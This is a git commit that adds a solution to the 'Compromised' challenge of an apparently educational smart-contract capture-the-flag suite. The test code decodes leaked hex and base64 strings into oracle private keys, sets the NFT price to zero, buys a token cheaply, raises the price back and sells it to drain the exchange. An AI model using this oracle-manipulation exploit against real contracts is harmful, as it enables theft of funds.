1cf6bbd9911a6550a6b26babb1aa0091e69908ae
Guillaume Debavelaere <guillaume.debavelaere@gmail.com>
2023-04-17 20:33:13 +0100

    Resolve challenge 7 - compromised

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -53,6 +53,28 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Get leaked private keys
+        const wallet1 = getWalletFromLeakData("4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35");
+        const wallet2 = getWalletFromLeakData("4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34");
+
+        // Setting price to 0
+        await oracle.connect(wallet1).postPrice('DVNFT', 0);
+        await oracle.connect(wallet2).postPrice('DVNFT', 0);
+        
+        // buying at low price
+        const tx = await exchange.connect(player).buyOne({value: ethers.utils.parseEther("0.00001")});
+        const resp = await tx.wait(1);
+        const event = resp.events.find(event => event.event === 'TokenBought');
+        const id = event.args['tokenId'];   
+        
+        // selling at high price
+        await oracle.connect(wallet1).postPrice('DVNFT', INITIAL_NFT_PRICE);
+        await oracle.connect(wallet2).postPrice('DVNFT', INITIAL_NFT_PRICE);
+        
+        await nftToken.connect(player).approve(exchange.address, id);
+        await exchange.connect(player).sellOne(id);
+        
+
     });
 
     after(async function () {
@@ -79,3 +101,16 @@ describe('Compromised challenge', function () {
         ).to.eq(INITIAL_NFT_PRICE);
     });
 });
+function getWalletFromLeakData(leakHexData) {
+    var base64String = Buffer.from(
+        leakHexData.split(' ').join(''),
+        'hex'
+    ).toString('utf8');
+    const hexKey = Buffer.from(base64String, `base64`).toString(`utf8`);
+
+    return new ethers.Wallet(
+        hexKey,
+        ethers.provider
+    );
+}
+
